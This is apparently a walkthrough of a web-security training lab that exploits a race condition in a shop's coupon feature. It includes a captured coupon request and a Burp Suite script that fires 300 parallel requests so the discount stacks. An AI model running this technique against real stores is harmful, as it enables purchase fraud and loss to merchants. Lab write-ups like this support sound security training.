## Limit overrun race conditions

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.

You can log in to your account with the following credentials: wiener:peter.

For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the Trigger race conditions custom action. This is only available in Burp Suite Professional.

Note :

Solving this lab requires Burp Suite 2023.9 or higher.

## Notes

- /cart
- coupon code

## Resume

1. Login with winer account
2. Add the Lightweight L33t Leather Jacket to your cart
3. Add the `PROMO20` to your cart and remove it
4. Send POST `PROMO20` request to repeater
5. Set up **Custom actions** with **triger race condition** as template and run it multiple time
6. Buy the Lightweight L33t Leather Jacket

## Solve 

Log in with wiener account, the do the usual workflow to add the Lightweight L33t Leather Jacket to your cart.
Apply the promo code once then remove it from the chart and send the request to repeater : 

```
POST /cart/coupon HTTP/2
Host: 0a350010043011f083789beb005400c4.web-security-academy.net
Cookie: session=WzVnLKpCHZxz8VNyZU6bQPgP1UwWg3Tw
Content-Length: 52
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a350010043011f083789beb005400c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a350010043011f083789beb005400c4.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=JWBMBIvmUUfwAxvoa5y9Tu2tLhtzNbd8&coupon=PROMO20
```

From repeater user **Custom actions**, create a new one **from template**. SCroll down to find **Trigger race condition** then click on **Create using this template** and save it without testing it. Edit the number of request to be sure that you'll have enough "money" to buy it.

```js
// This will use the single-packet attack for HTTP/2, and last-byte synchronisation for HTTP/1
int NUMBER_OF_REQUESTS = 300;
var reqs = new ArrayList<HttpRequest>();
for (int i = 0; i < NUMBER_OF_REQUESTS; i++)
{
  reqs.add(requestResponse.request());
}
var responses = api().http().sendRequests(reqs);
var codes = responses.stream().map(HttpRequestResponse::response).map(HttpResponse::statusCode).collect(Collectors.toList());
logging().logToOutput(codes);
```

Refresh the cart page to see that the discount applied is now : 

```
Code	Reduction
PROMO20	-$1321.60
```

You can now buy the Lightweight L33t Leather Jacket
